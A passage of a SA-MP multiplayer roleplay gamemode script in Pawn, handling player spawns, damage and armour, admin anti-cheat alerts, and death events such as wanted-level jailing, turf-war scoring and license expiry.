			    SetPlayerPosEx(playerid, 375.0248,-2078.2959,7.8661);
			}
			if(randomspawn == 3 || randomspawn == 6)
			{
			    SetPlayerPosEx(playerid, 384.9585,-2078.2041,7.8661);
			}
			if(randomspawn == 4 || randomspawn == 5 || randomspawn == 9)
			{
				SetPlayerPosEx(playerid, 394.1896,-2078.0164,7.8661);
			}
			SetPlayerFacingAngle(playerid, 0.7501);
			SetPlayerInterior(playerid,0);
			PlayerInfo[playerid][pInt] = 0;
			SetPlayerVirtualWorld(playerid, 0);
	        return 1;
	    }
	    if ((gTeam[playerid]) == 3)
	    {
			new randomspawn = 1 + random(7);
	        if(randomspawn == 1 || randomspawn == 8)
			{
				SetPlayerPosEx(playerid, 364.0286,-2077.6917,7.8661);
			}
			if(randomspawn == 2 || randomspawn == 7)
			{
			    SetPlayerPosEx(playerid, 375.0248,-2078.2959,7.8661);
			}
			if(randomspawn == 3 || randomspawn == 6)
			{
			    SetPlayerPosEx(playerid, 384.9585,-2078.2041,7.8661);
			}
			if(randomspawn == 4 || randomspawn == 5 || randomspawn == 9)
			{
				SetPlayerPosEx(playerid, 394.1896,-2078.0164,7.8661);
			}
			SetPlayerFacingAngle(playerid, 6.9127);
			SetPlayerInterior(playerid,0);
			PlayerInfo[playerid][pInt] = 0;
			SetPlayerVirtualWorld(playerid, 0);
			return 1;
		}
	    else
	    {
			SetPlayerToTeamColor(playerid);
			if(PlayerInfo[playerid][pOrigin] == 1) // Europa
			{
				new randomspawn = 1 + random(7);
				if(randomspawn == 1 || randomspawn == 8)
				{
					SetPlayerPosEx(playerid, 364.0286,-2077.6917,7.8661);
				}
				if(randomspawn == 2 || randomspawn == 7)
				{
					SetPlayerPosEx(playerid, 375.0248,-2078.2959,7.8661);
				}
				if(randomspawn == 3 || randomspawn == 6)
				{
					SetPlayerPosEx(playerid, 384.9585,-2078.2041,7.8661);
				}
				if(randomspawn == 4 || randomspawn == 5 || randomspawn == 9)
				{
					SetPlayerPosEx(playerid, 394.1896,-2078.0164,7.8661);
				}
				SetPlayerFacingAngle(playerid, 6.9127);
				SetPlayerInterior(playerid,0);
				PlayerInfo[playerid][pInt] = 0;
				SetPlayerVirtualWorld(playerid, 0);
			}
			else if(PlayerInfo[playerid][pOrigin] == 2) // America
			{
				new randomspawn = 1 + random(7);
		        if(randomspawn == 1 || randomspawn == 8)
				{
					SetPlayerPosEx(playerid, 364.0286,-2077.6917,7.8661);
				}
				if(randomspawn == 2 || randomspawn == 7)
				{
					SetPlayerPosEx(playerid, 375.0248,-2078.2959,7.8661);
				}
				if(randomspawn == 3 || randomspawn == 6)
				{
					SetPlayerPosEx(playerid, 384.9585,-2078.2041,7.8661);
				}
				if(randomspawn == 4 || randomspawn == 5 || randomspawn == 9)
				{
					SetPlayerPosEx(playerid, 394.1896,-2078.0164,7.8661);
				}
				SetPlayerFacingAngle(playerid, 6.9127);
				SetPlayerInterior(playerid,0);
				PlayerInfo[playerid][pInt] = 0;
				SetPlayerVirtualWorld(playerid, 0);
			}
			else if(PlayerInfo[playerid][pOrigin] == 3) // Asia
			{
				new randomspawn = 1 + random(7);
		        if(randomspawn == 1 || randomspawn == 8)
				{
					SetPlayerPosEx(playerid, 364.0286,-2077.6917,7.8661);
				}
				if(randomspawn == 2 || randomspawn == 7)
				{
					SetPlayerPosEx(playerid, 375.0248,-2078.2959,7.8661);
				}
				if(randomspawn == 3 || randomspawn == 6)
				{
					SetPlayerPosEx(playerid, 384.9585,-2078.2041,7.8661);
				}
				if(randomspawn == 4 || randomspawn == 5 || randomspawn == 9)
				{
					SetPlayerPosEx(playerid, 394.1896,-2078.0164,7.8661);
				}
				SetPlayerFacingAngle(playerid, 6.9127);
				SetPlayerInterior(playerid,0);
				PlayerInfo[playerid][pInt] = 0;
				SetPlayerVirtualWorld(playerid, 0);
			}
			else if(PlayerInfo[playerid][pOrigin] == 4) // Africa
			{
				new randomspawn = 1 + random(7);
		        if(randomspawn == 1 || randomspawn == 8)
				{
					SetPlayerPosEx(playerid, 364.0286,-2077.6917,7.8661);
				}
				if(randomspawn == 2 || randomspawn == 7)
				{
					SetPlayerPosEx(playerid, 375.0248,-2078.2959,7.8661);
				}
				if(randomspawn == 3 || randomspawn == 6)
				{
					SetPlayerPosEx(playerid, 384.9585,-2078.2041,7.8661);
				}
				if(randomspawn == 4 || randomspawn == 5 || randomspawn == 9)
				{
					SetPlayerPosEx(playerid, 394.1896,-2078.0164,7.8661);
				}
				SetPlayerFacingAngle(playerid, 6.9127);
				SetPlayerInterior(playerid,0);
				PlayerInfo[playerid][pInt] = 0;
				SetPlayerVirtualWorld(playerid, 0);
			}
			else if(PlayerInfo[playerid][pOrigin] == 5) // Australia
			{
				new randomspawn = 1 + random(7);
		        if(randomspawn == 1 || randomspawn == 8)
				{
					SetPlayerPosEx(playerid, 364.0286,-2077.6917,7.8661);
				}
				if(randomspawn == 2 || randomspawn == 7)
				{
					SetPlayerPosEx(playerid, 375.0248,-2078.2959,7.8661);
				}
				if(randomspawn == 3 || randomspawn == 6)
				{
					SetPlayerPosEx(playerid, 384.9585,-2078.2041,7.8661);
				}
				if(randomspawn == 4 || randomspawn == 5 || randomspawn == 9)
				{
					SetPlayerPosEx(playerid, 394.1896,-2078.0164,7.8661);
				}
				SetPlayerFacingAngle(playerid, 6.9127);
				SetPlayerInterior(playerid,0);
				PlayerInfo[playerid][pInt] = 0;
				SetPlayerVirtualWorld(playerid, 0);
			}
			else
			{
                SetPlayerPosEx(playerid,358.0976,-1841.3488,5.1257);
				SetPlayerInterior(playerid,0);
			    SetPlayerFacingAngle(playerid, 90.0);
		        SetPlayerCameraPos(playerid,1460.0, -1324.0, 287.2);
			    SetPlayerCameraLookAt(playerid,1374.5, -1291.1, 239.0);
	            PlayerPlaySound(playerid, 1097,-119.9460,23.1096,12.2238);
			}
		}
		UpdateSecondary(playerid);
	}
	return 1;
}

forward UpdateSecondary(playerid);
public UpdateSecondary(playerid)
{
    if(gPlayerLogged[playerid] != 0)
	{
		Update(playerid, pConnectTimex);
		Update(playerid, pBank);
		Update(playerid, pCashx);
		Update(playerid, pRP);
		Update(playerid, pPayDayx);
		Update(playerid, pJailTimex);
		Update(playerid, pPremiumPointsx);
		Update(playerid, pGPointsx);
		OnPlayerDateUpdateX2(playerid);
	}
	return 1;
}

forward OnPlayerDateUpdateX2(playerid);
public OnPlayerDateUpdateX2(playerid)
{
	if(IsPlayerConnected(playerid))
	{
		new var[556];
		{
			mysql_format(SQL,var,sizeof(var),"UPDATE `users` SET `CarLic`='%d',`FlyLic`='%d',`BoatLic`='%d',`GunLic`='%d',`CarLicT`='%d',`FlyLicT`='%d',`BoatLicT`='%d',`GunLicT`='%d',`Rob`='%d',`Jailed`='%d',`HitT`='%d',`Muted`='%d',`MuteTime`='%d' WHERE `name`='%s'",
			PlayerInfo[playerid][pCarLic],
			PlayerInfo[playerid][pFlyLic],
			PlayerInfo[playerid][pBoatLic],
			PlayerInfo[playerid][pGunLic],
			PlayerInfo[playerid][pCarLicT],
	  		PlayerInfo[playerid][pFlyLicT],
			PlayerInfo[playerid][pBoatLicT],
			PlayerInfo[playerid][pGunLicT],
			PlayerInfo[playerid][pRob],
			PlayerInfo[playerid][pJailed],
			PlayerInfo[playerid][pHitT],
			PlayerInfo[playerid][pMuted],
			PlayerInfo[playerid][pMuteTime],
			PlayerInfo[playerid][pNormalName]);
			mysql_tquery(SQL,var,"","");
		}
	}
	return 1;
}

public OnPlayerTakeDamage(playerid, issuerid, Float:amount, weaponid, bodypart)
{
	if(issuerid != INVALID_PLAYER_ID)
    {
		if(amount < 0)
		{
			new string[256],sendername[25];
		    GetPlayerName(issuerid,sendername,sizeof(sendername));
			format(string, sizeof(string), "{0000ff}[Anti-Cheat]:{FFFFFF} %s (%d, level %d) can use global kill, damage: %.2f.",sendername,issuerid,PlayerInfo[issuerid][pLevel],amount);
            ABroadCast(COLOR_RED,string,1);
			return 1;
		}
		if(weaponid == 54 && GetPlayerState(issuerid) != PLAYER_STATE_DRIVER)
		{
		    if(playerdeath[issuerid] == 0)
		    {
				new Float:HP, Float:AP, Float:remainHP;
			 	GetPlayerHealthEx(issuerid,HP);
			 	GetPlayerArmourEx(issuerid,AP);
				if ( AP >= amount )
				{
					SetPlayerArmourEx( issuerid, AP - amount );
					SetPlayerHealthEx( issuerid, HP );
				}
				else if ( AP <= 0 )
				{
					remainHP = HP - amount;
					SetPlayerHealthEx( issuerid, remainHP );
					if ( remainHP <= 0 && playerdeath[issuerid] == 0 )
					{
						OnPlayerDeath( playerid, issuerid, weaponid );
						playerdeath[playerid] = 1;
					}
				}
				else
				{
					remainHP = HP + ( AP - amount );
					SetPlayerArmourEx( issuerid, 0.0 );
					SetPlayerHealthEx( issuerid, remainHP );
					if ( remainHP <= 0 && playerdeath[issuerid] == 0 )
					{
						OnPlayerDeath( playerid, issuerid, weaponid );
						playerdeath[issuerid] = 1;
					}
				}
			}
		}
	}
	if(weaponid == 49 || weaponid == 50 || weaponid == 51 || weaponid == 52 || weaponid == 53 || weaponid == 54 || GetPlayerState(issuerid) == PLAYER_STATE_DRIVER)
	{
	    if(playerdeath[playerid] == 0)
	    {
			new Float:HP, Float:AP, Float:remainHP;
		 	GetPlayerHealthEx(playerid,HP);
		 	GetPlayerArmourEx(playerid,AP);
			if ( AP >= amount )
			{
				SetPlayerArmourEx( playerid, AP - amount );
				SetPlayerHealthEx( playerid, HP );
			}
			else if ( AP <= 0 )
			{
				remainHP = HP - amount;
				SetPlayerHealthEx( playerid, remainHP );
				if ( remainHP <= 0 && playerdeath[playerid] == 0 )
				{
					OnPlayerDeath( playerid, issuerid, weaponid );
					playerdeath[playerid] = 1;
				}
			}
			else
			{
				remainHP = HP + ( AP - amount );
				SetPlayerArmourEx( playerid, 0.0 );
				SetPlayerHealthEx( playerid, remainHP );
				if ( remainHP <= 0 && playerdeath[playerid] == 0 )
				{
					OnPlayerDeath( playerid, issuerid, weaponid );
					playerdeath[playerid] = 1;
				}
			}
		}
	}
	return 1;
}

public OnPlayerGiveDamage(playerid, damagedid, Float:amount, weaponid, bodypart)
{
	if(damagedid != INVALID_PLAYER_ID)
    {
	 	if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER) return 1;
		if(GetPlayerSurfingVehicleID(playerid) != INVALID_VEHICLE_ID) return 1;
		if(amount < 0)
		{
			new string[256],sendername[25];
		    GetPlayerName(playerid,sendername,sizeof(sendername));
			format(string, sizeof(string), "{0000ff}[Anti-Cheat]:{FFFFFF} %s (%d, level %d) can use global kill, damage: %.2f.",sendername, playerid, PlayerInfo[playerid][pLevel], amount);
            ABroadCast(COLOR_RED,string,1);
			return 1;
		}
		if(PlayerInfo[playerid][pMember] == PlayerInfo[damagedid][pMember] && PlayerInfo[playerid][pMember] > 0)
		{
			if(InWar[PlayerInfo[playerid][pMember]] > 0)
			{
				new Float: HP;
				GetPlayerHealthEx(damagedid,HP);
				SetPlayerHealthEx(damagedid, HP);
				return 1;
			}
		}
		if(T_SAU_CT[playerid] > 0)
		{
			if(T_SAU_CT[playerid] == T_SAU_CT[damagedid])
			{
				new Float: HP;
				GetPlayerHealthEx(damagedid,HP);
				SetPlayerHealthEx(damagedid, HP);
				return 1;
			}
		}	
		foreach(Player,i)
		{
		    if(PlayerInfo[i][pAdmin] >= 1 || PlayerInfo[i][pHelper] >= 1)
		    {
				if(IsPlayerConnected(i))
				{
					if(Spectate[i] != -1)
					{
					    playerid = Spectate[i];
						if(DMGadmin[i] == 1)
						{
						    new gunname[100],s1[500],kil[75],playern[75];
						    new wep = GetPlayerWeapon(playerid);
						    if(wep > 0 && wep < 43)
						    {
						        GetPlayerName(playerid, kil, 75);
						        GetPlayerName(damagedid, playern, 75);
								GetWeaponNameEx(wep,gunname,100);
								format(s1,500,"%s give damage in %s, damage: %.2f with gun %s",kil,playern,amount,gunname);
								SendClientMessage(i,COLOR_YELLOW,s1);
							}
						}
					}
				}
			}
		}
		if(PlayerInfo[playerid][pPaintBallG] > 0)
		{
		    PlayerPlaySound(playerid,17802,0.0,0.0,0.0);
		}
		new fpm,fkm;
    	fpm = PlayerInfo[playerid][pMember];
    	fkm = PlayerInfo[damagedid][pMember];
    	for(new turf = 1; turf < sizeof(TurfInfo); turf++)
		{
         	if(IsPlayerInTurf(playerid, turf) && IsPlayerInTurf(damagedid, turf))
         	{
                if(IsAMember(playerid) && IsAMember(damagedid))
                {
	             	if(WarInfo[turf][wFaction] == fpm && WarInfo[turf][wAttacker] == fkm || WarInfo[turf][wFaction] == fkm && WarInfo[turf][wAttacker] == fpm)
	             	{
	             	    PlayerPlaySound(playerid,17802,0.0,0.0,0.0);
					}
				}
			}
		}
		if(PlayerInfo[damagedid][pPaintBallG] > 0)
		{
		    if(paint_incepe > 0)
		    {
		    	SetPlayerHealthEx(damagedid, 100.0);
			}
		}
		if(playerdeath[damagedid] == 0)
		{
			if(weaponid == 34 && PlayerInfo[damagedid][pPaintBallG] < 1)
		    {
		        SetPlayerHealthEx(damagedid, 0.0);
		        SetPlayerArmourEx(damagedid, 0.0);
		        OnPlayerDeath(damagedid,playerid,weaponid);
				playerdeath[damagedid] = 1;
				return 1;
		    }
		 	new Float: HP, Float: AP ;
			GetPlayerHealthEx(damagedid,HP);
			GetPlayerArmourEx(damagedid,AP);
			if ( AP >= amount )
			{
				SetPlayerArmourEx ( damagedid, AP - amount );
			}
			else if ( AP <= 0 )
			{
				new const Float: remainHP = HP - amount;
				SetPlayerHealthEx ( damagedid, remainHP );
				if ( remainHP <= 0 )
				{
					OnPlayerDeath( damagedid, playerid, weaponid );
					playerdeath[damagedid] = 1;
					return 1;
				}
			}
			else
			{
				new const Float: remainHP = HP + ( AP - amount );
				SetPlayerArmourEx ( damagedid, 0.0 );
				SetPlayerHealthEx ( damagedid, remainHP );
				if ( remainHP <= 0 )
				{
					OnPlayerDeath( damagedid, playerid, weaponid );
					playerdeath[damagedid] = 1;
					return 1;
				}
			}
			if(PlayerCuffed[damagedid] == 1)
			{
				SetPlayerHealthEx(damagedid,100);
			}
			if(PlayerInfo[damagedid][pSleeping] == 1)
			{
				SetPlayerHealthEx(damagedid, 100);
			}
			if(tazer[playerid] == 1 && IsACop(playerid) && weaponid == 24)
			{
				if(IsACop(damagedid)) return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}Cannot Tazer Cops/FBI/National Guard.");
				if(PlayerCuffed[damagedid] == 1) return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}Player already tazed.");
				if(PlayerInfo[damagedid][pSleeping] == 1) return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}Player is on sleeping.");
				if(GetDistanceBetweenPlayers(playerid,damagedid) < 15)
				{
					new string[126],sendername[25],giveplayer[25];
					GetPlayerName(playerid,sendername,sizeof(sendername));
					GetPlayerName(damagedid,giveplayer,sizeof(giveplayer));
					format(string, sizeof(string), "* You were Tazed by %s for 8 seconds.", sendername);
					SendClientMessage(damagedid, COLOR_LIGHTBLUE, string);
					format(string, sizeof(string), "* You Tazed %s for 8 seconds.", giveplayer);
					SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
					format(string, sizeof(string), "* %s shoots with his Tazer at %s, and tazed him.", sendername ,giveplayer);
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					GameTextForPlayer(damagedid, "~r~~h~Tazed", 2500, 3);
					TogglePlayerControllable(damagedid, 0);
					PlayerCuffed[damagedid] = 1;
					PlayerCuffedTime[damagedid] = 8;
					SetPlayerHealthEx(damagedid,100);
				}
			}
		}
	}
	return 1;
}

stock GetName(playerid)
{
	new name[60];
	GetPlayerName(playerid,name,sizeof(name));
	return name;
}

public OnPlayerDeath(playerid, killerid, reason)
{
	if(killerid != INVALID_PLAYER_ID)
	{
		if(IsPlayerConnected(killerid))
		{
			ucideri_detectare_aimbot[killerid]++;
			if(ucideri_detectare_aimbot[killerid] >= 3)
			{
				new string[1024];
				format(string, sizeof(string), "[Admin-Warn]: {FFFFFF}%s it is possible to use aimbot, use the command /spec to check!",PlayerInfo[killerid][pNormalName]);
				ABroadCast(COLOR_AdminWarn, string, 1);
			}
		}
	}
	if(incwar[playerid] > 0)
	{
		mortcwar[playerid] = 1;
		for(new x = 0; x < sizeof(CWarTD); x++) PlayerTextDrawHide(playerid, CWarTD[x]);
	}
	p_ac[playerid] = 1;
	if(racingcar[playerid] >= 0)
	{
		DisableRemoteVehicleCollisions(playerid, 0);
		DisablePlayerRaceCheckpoint(playerid);
		CP[playerid] = 0;
		SetVehicleVirtualWorld(racingcar[playerid], 0);
		DestroyVehicle(racingcar[playerid]);
		SetPlayerVirtualWorld(playerid, 0);
		TogglePlayerControllable(playerid, 1);
		racingcar[playerid] = -1;
		SCM(playerid, COLOR_SERVER, "The race was stopped because of death.");
	}
	if(esteinds[playerid] > 0)
	{
		DealerShipTextDrawHide(playerid);
	}
	if(esteinATM[playerid] > 0)
	{
	    OpresteATM(playerid);
	}
	if(killerid != INVALID_PLAYER_ID)
	{
	    SpawnPlayer(playerid);
	    new playername[30],killername[30];
		GetPlayerName(playerid,playername,sizeof(playername));
		GetPlayerName(killerid,killername,sizeof(killername));
		if(strlen(playername) > 30) return Kick(playerid);
		if(strlen(killername) > 30) return Kick(killerid);
		if(BusinessRob[playerid] > 0)
		{
			DisablePlayerCheckpoint(playerid);
			BusinessRob[playerid] = 0;
			RobTime[playerid] = -1;
			RobTimer[playerid] = -1;
			SendClientMessage(playerid, COLOR_ROB, "Robbery failed because you died.");
		}
		if(pocketjaf[playerid] == 1 && omoarathief[killerid] == 1)
		{
		    SCM(playerid, -1, "{408080}You were killed by the victim and you lose money.");
		    SCM(killerid, -1, "{408080}You Were Killed by the victim and you lose money.");
			GivePlayerCash(killerid, thiefmoney[playerid]);
			GivePlayerCash(playerid, -thiefmoney[playerid]);
		    pocketjaf[playerid] = 0;
		    thiefplayer[playerid] = 999;
		    thiefmoney[playerid] = 0;
		    Update(playerid, pCashx);
			Update(killerid, pCashx);
		}
	    if(PlayerInfo[playerid][pWantedLevel] >= 1)
		{
		    new copkill=0, price = PlayerInfo[playerid][pWantedLevel] * 1000, count, str23[MAX_STRING], totalprice = price / 2, string[256], lastname[30], streap[30];
		    if((PlayerInfo[playerid][pMember] != 1 && PlayerInfo[playerid][pMember] != 2 && PlayerInfo[playerid][pMember] != 3 && PlayerInfo[playerid][pMember] != 8))
			{
			    for(new i = 0; i < MAX_PLAYERS; i++)
				{
				    if(IsPlayerConnected(i))
					{
					    if((IsACop(i) && CrimInRange(50.0, playerid,i) && OnDuty[i] == 1)|| (IsACop(i) && killerid == i))
						{
						    if(OnDuty[i] != 1) return 1;
							GetPlayerName(killerid, lastname, sizeof(lastname));
							GetPlayerName(playerid, streap, sizeof(streap));
							count++;
							GameTextForPlayer(i, "Running Suspect bonus!", 5000, 1);
							format(string, sizeof(string), "You got $%d bonus for catching the suspect %s.", totalprice, streap);
							SendClientMessage(i, COLOR_DBLUE, string);
							ConsumingMoney[i] = 1;
							GivePlayerCash(i, price);
							Update(i, pCashx);
							PlayerInfo[i][pRunners] += 1;
							Update(i,pRunnersx);
							new idfac = PlayerInfo[i][pMember];
                        	DynamicFactions[idfac][fBank] += totalprice;
							mysql_format(SQL,str23,sizeof(str23),"UPDATE `factions` SET `Bank`='%d' WHERE `ID`='%d'", DynamicFactions[idfac][fBank], idfac);
							mysql_tquery(SQL,str23,"","");
							PlayerPlaySound(i, 1058, 0.0, 0.0, 0.0);
							format(string, sizeof(string),"Dispatch: %s has been killed by %s and will be in jail for %d seconds, over.",streap,lastname,(PlayerInfo[playerid][pWantedLevel]*300));
							copkill = 1;
						}
					}
				}
				if(copkill == 1)
				{
					SendTeamMessage(1, COLOR_LIGHTBLUE, string);
					SendTeamMessage(2, COLOR_LIGHTBLUE, string);
					SendTeamMessage(3, COLOR_LIGHTBLUE, string);
					SendTeamMessage(8, COLOR_LIGHTBLUE, string);
					SendTeamMessage(15, COLOR_LIGHTBLUE, string);
					PlayerInfo[playerid][pJailTime] = (PlayerInfo[playerid][pWantedLevel])*(300);
					format(string, sizeof(string), "Because you got killed, you lost $%s and you will be taken to jail. You are no longer a criminal.", FormatNumber(price));
					SendClientMessage(playerid, COLOR_ERROR, string);
					PlayerInfo[playerid][pJailed] = 1;
					PlayerInfo[playerid][pWantedLevel] = 0;
					PlayerInfo[playerid][pWantedDeaths] += 1;
					WantedPoints[playerid] = 0;
					GivePlayerCash(playerid, - price);
					Update(playerid,pWantedLevelx);
					Update(playerid,pJailedx);
					Update(playerid,pJailTimex);
					ClearCrime(playerid);
					TogglePlayerControllable(playerid, 0);
					SetTimerEx("UnFreezeStation", 1000, false, "i", playerid);
				}
			}
		}
     	DeadScris[playerid] = CreateDynamic3DTextLabel("{ba9789}[dead]", COLOR_SERVER, 0, 0, -20, 20, playerid);
		Streamer_SetFloatData(STREAMER_TYPE_3D_TEXT_LABEL, DeadScris[playerid] , E_STREAMER_ATTACH_OFFSET_Z, 0.31);
		new name[MAX_PLAYER_NAME],
			string[500],
			Float:px,
			Float:py,
			Float:pz;
		gPlayerUsingLoopingAnim[playerid] = 0;
		gPlayerSpawned[playerid] = 0;
		GetPlayerName(playerid, name, sizeof(name));
		PlayerInfo[playerid][pLocal] = 255;
		GetPlayerPos(playerid, px, py, pz);
 	   	new currentveh = GetPlayerVehicleID(playerid);
		printf("DEATH: %s was killed by %s with gun %d",name,GetName(killerid),reason);
		playerdeath[playerid] = 0;
		curatj[playerid] = 0;
		PlayerEnterTime[playerid]+=221;
		if(GetPlayerState(killerid) == PLAYER_STATE_DRIVER && !IsAPlane(currentveh))
		{
		    GetPlayerName(playerid,name,sizeof(name));
		    new kill[25];
		    GetPlayerName(killerid,kill,sizeof(kill));
			format(string, sizeof(string), "[Admin-Warn]: {FFFFFF}%s has been killed by %s by drive-by.",name, kill);
            ABroadCast(COLOR_AdminWarn,string,1);
		}
	    if(XDeaths[playerid] == 0)
	    {
	       LastDeath[playerid] = gettime();
	    }
	    XDeaths[playerid]++;
	    if(XDeaths[playerid] == 2)
	    {
	        if((gettime() - LastDeath[playerid]) <= 2)
	        {
	            Kick(playerid);
	            return 1;
	        }else
	        if((gettime() - LastDeath[playerid]) > 2)
	        {
	            XDeaths[playerid]=0;
	        }
	    }
 		if(killerid == playerid)
		{
            Kick(killerid);
            return 1;
		}
		if(PlayerCuffed2[playerid] == 1)
		{
		    PlayerCuffed2[playerid] = 0;
	    	SetPlayerSpecialAction(playerid,SPECIAL_ACTION_NONE);
	    	RemovePlayerAttachedObject(playerid,1);
		}
		if(reason == 38 && GetPlayerState(killerid) != PLAYER_STATE_DRIVER)
		{
			new kickname[25];
			if(IsPlayerConnected(killerid))
			{
				if(PlayerInfo[killerid][pAdmin] == 0 && PlayerInfo[killerid][pHelper] == 0)
				{
					GetPlayerName(killerid, kickname, sizeof(kickname));
					format(string, sizeof(string), "{0000ff}[Anti-Cheat]:{FFFFFF} %s (%d, level %d) killed a player using a minigun.",kickname,killerid,PlayerInfo[killerid][pLevel]);
					ABroadCast(COLOR_RED,string,1);
				}
			}
		}
		if(flymode[playerid] == 1)
		{
		    new string23[128],sendername[30];
		    GetPlayerName(playerid,sendername,sizeof(sendername));
		    flymode[playerid] = 0;
		    format(string23,sizeof(string23),"%s has stopped flymode.", sendername);
		    ABroadCast(COLOR_YELLOW,string23,1);
			StopFly(playerid);
		}
		if(Hatss[playerid] > 0)
		{
		    Hatss[playerid] = 0;
		}
		if(Sunglasses[playerid] > 0)
		{
			Sunglasses[playerid] = 0;
		}
  	  	if(TakingLesson[playerid] == 1)
   		{
        	TakingLesson[playerid] = 0;
			DestroyVehicle(examcar[playerid]);
			DisableRemoteVehicleCollisions(playerid, 0);
			examcar[playerid] = -1;
	    	DisablePlayerRaceCheckpoint(playerid);
        	PlayerTextDrawHide(playerid, DMVexam[playerid]);
        	PlayerTextDrawHide(playerid, DMVcheck[playerid]);
    	}
		if(gPlayerUsingLoopingAnim[playerid])
		{
        	gPlayerUsingLoopingAnim[playerid] = 0;
		}
		if(PlayerInfo[playerid][pCarLicT] == 0 && PlayerInfo[playerid][pCarLic] == 1)
		{
            PlayerInfo[playerid][pCarLic] = 0;
			PlayerInfo[playerid][pCarLicT] = 0;
			new str[128];
			mysql_format(SQL,str,128,"UPDATE users SET `CarLic`='0',`CarLicT`='0' WHERE `name`='%s'",PlayerInfo[playerid][pNormalName]);
			mysql_tquery(SQL,str,"","");
			SCM(playerid,COLOR_GRAD1,"Your driving license has expired.");
		}
		if(PlayerInfo[playerid][pFlyLicT] == 0 && PlayerInfo[playerid][pFlyLic] == 1)
		{
		    PlayerInfo[playerid][pFlyLic] = 0;
		    PlayerInfo[playerid][pFlyLicT] = 0;
			new str[128];
			mysql_format(SQL,str,128,"UPDATE users SET `FlyLic`='0',`FlyLicT`='0' WHERE `name`='%s'",PlayerInfo[playerid][pNormalName]);
			mysql_tquery(SQL,str,"","");
			SCM(playerid,COLOR_GRAD1,"Your flying license has expired.");
		}
		if(PlayerInfo[playerid][pBoatLicT] == 0 && PlayerInfo[playerid][pBoatLic] == 1)
		{
		    PlayerInfo[playerid][pBoatLic] = 0;
		    PlayerInfo[playerid][pBoatLic] = 0;
			new str[128];
			mysql_format(SQL,str,128,"UPDATE users SET `BoatLic`='0',`BoatLicT`='0' WHERE `name`='%s'",PlayerInfo[playerid][pNormalName]);
			mysql_tquery(SQL,str,"","");
			SCM(playerid,COLOR_GRAD1,"Your boat license has expired.");
		}
		if(PlayerInfo[playerid][pGunLicT] == 0 && PlayerInfo[playerid][pGunLic] == 1)
		{
		    PlayerInfo[playerid][pGunLic] = 0;
		    PlayerInfo[playerid][pGunLicT] = 0;
			new str[128];
			mysql_format(SQL,str,128,"UPDATE users SET `GunLic`='0',`GunLicT`='0' WHERE `name`='%s'",PlayerInfo[playerid][pNormalName]);
			mysql_tquery(SQL,str,"","");
			SCM(playerid,COLOR_GRAD1,"Your gun license has expired.");
		}
	    new fpm,fkm;
    	fpm = PlayerInfo[playerid][pMember];
    	fkm = PlayerInfo[killerid][pMember];
    	for(new turf = 1; turf < sizeof(TurfInfo); turf++)
		{
         	if(IsPlayerInTurf(playerid, turf) && IsPlayerInTurf(killerid, turf))
         	{
                if(IsAMember(playerid) && IsAMember(killerid))
                {
	             	if(WarInfo[turf][wFaction] == fpm && WarInfo[turf][wAttacker] == fkm || WarInfo[turf][wFaction] == fkm && WarInfo[turf][wAttacker] == fpm)
	             	{
				     	if(fkm == WarInfo[turf][wAttacker] || fkm == WarInfo[turf][wFaction])
					 	{
					     	WarScoreF[fkm][turf] += 1;
					 	}
	                 	ucideri[killerid][turf] ++;
	                 	decese[playerid][turf] ++;
	                 	foreach(Player, i)
	                 	{
	                 	    new fpm2;
	                 	    fpm2 = PlayerInfo[i][pMember];
	                 	    if(IsAMember(i))
                			{
                			    if(WarInfo[turf][wFaction] == fpm2 || WarInfo[turf][wAttacker] == fpm2)
  								{
                			    	SendDeathMessageToPlayer(i, killerid, playerid, reason);
								}
							}
						}
	                 	if(PlayerInfo[killerid][pMember] == WarInfo[turf][wAttacker])
	                 	{
		                 	if((ucideri[killerid][turf]-decese[killerid][turf]) > bestscoreat[turf])
		                 	{
		                     	bestscoreat[turf] = (ucideri[killerid][turf]-decese[killerid][turf]);
		                     	bestmemberat[turf] = killerid;
		                 	}
	                 	}
	                 	if(PlayerInfo[killerid][pMember] == WarInfo[turf][wFaction])
	                 	{
		                 	if((ucideri[killerid][turf]-decese[killerid][turf]) > bestscoredf[turf])
		                 	{
		                     	bestscoredf[turf] = (ucideri[killerid][turf]-decese[killerid][turf]);
		                     	bestmemberdf[turf] = killerid;
		                 	}
	                 	}
	                 	if(PlayerInfo[playerid][pMember] == WarInfo[turf][wAttacker])
	                 	{
	                 		if((ucideri[playerid][turf]-decese[playerid][turf]) < worstscoreat[turf])
							{
								worstscoreat[turf] = (ucideri[playerid][turf]-decese[playerid][turf]);
								worstmemberat[turf] = playerid;
							}
						}
	                 	if(PlayerInfo[playerid][pMember] == WarInfo[turf][wFaction])
	                 	{
	                 		if((ucideri[playerid][turf]-decese[playerid][turf]) < worstscoredf[turf])
							{
								worstscoredf[turf] = (ucideri[playerid][turf]-decese[playerid][turf]);
								worstmemberdf[turf] = playerid;
							}
						}
						if(IsPlayerConnected(playerid) && IsPlayerConnected(killerid))
						{
							new name1[60];
							GetPlayerName(playerid,name1,sizeof(name1));
							format(string, sizeof(string), "You have killed %s (%d).", name1, playerid);
							SCM(killerid, COLOR_GENANNOUNCE, string);
							new name2[60];
							GetPlayerName(killerid,name2,sizeof(name2));
							format(string, sizeof(string), "You have been killed by %s (%d).", name2, killerid);
							SCM(playerid, COLOR_GENANNOUNCE, string);
						}	
	                 	PlayerInfo[killerid][pWKills] += 1;
						Update(playerid,pWKillsx);
						PlayerInfo[playerid][pWDeaths] += 1;
						Update(playerid,pWDeathsx);
						/*new Float:xxx,Float:yyy,FLoat:zzz;
						GetPlayerPos(playerid,xxx,yyy,zzz);
						warobjects++;
						warweapoobj++;
						SpawnPlayer(playerid);
						warobjj[warobjects] = CreatePickup(1240, 2, xxx+1,yyy,zzz, GetPlayerVirtualWorld(killerid));*/
						if(PlayerInfo[playerid][pMember] == 4 || PlayerInfo[playerid][pMember] == 6)
						{
							SetPlayerVirtualWorld(playerid, 1);
						}
						else
						{
							SetPlayerVirtualWorld(playerid, 0);
						}
	                 	return 1;
					}
             	}
         	}
    	}
		if (gPlayerCheckpointStatus[playerid] > 4 && gPlayerCheckpointStatus[playerid] < 11)
		{
			DisablePlayerCheckpoint(playerid);
